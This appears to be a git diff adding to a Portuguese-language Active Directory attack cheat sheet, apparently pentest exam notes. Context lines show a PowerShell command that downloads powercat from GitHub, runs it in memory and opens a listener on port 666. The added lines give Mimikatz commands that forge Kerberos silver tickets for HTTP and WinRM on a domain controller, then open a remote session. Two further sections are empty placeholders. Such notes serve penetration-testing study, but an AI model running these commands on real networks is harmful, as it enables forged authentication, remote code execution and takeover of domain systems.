@@ -1408,6 +1408,42 @@ AGUARDAR A CONEXÃO:
 IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/powercat.ps1")
 powercat -l -p 666 -v
 ```
+##### SILVER TICKET MIMIKATZ - GERAR TICKET P SERVICO NO COMPUTADOR ALVO EM QQ MAQUINA (TERMINAL NORMAL): POWERSHELL REMOTING
+```
+kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:tech-dc01.tech.local /service:http /rc4:30e8b803609241d0e6ae3587a932d97a /user:administrator /ptt
+kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:tech-dc01.tech.local /service:wsman /rc4:30e8b803609241d0e6ae3587a932d97a /user:administrator /ptt
+```
+ACESSAR O COMPUTADOR REMOTO:
+```
+enter-pssession -computername tech-dc01.tech.local
+```
+##### SILVER TICKET MIMIKATZ - GERAR TICKET P SERVICO NO COMPUTADOR ALVO EM QQ MAQUINA (TERMINAL NORMAL): LDAP DCSYNC
+```
+aaa
+```
+##### SILVER TICKET MIMIKATZ - GERAR TICKET P SERVICO NO COMPUTADOR ALVO EM QQ MAQUINA (TERMINAL NORMAL): WMI COMMAND
+```
+bbb
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 [SPN](https://adsecurity.org/?page_id=183)
 
 SERVIÇOS:
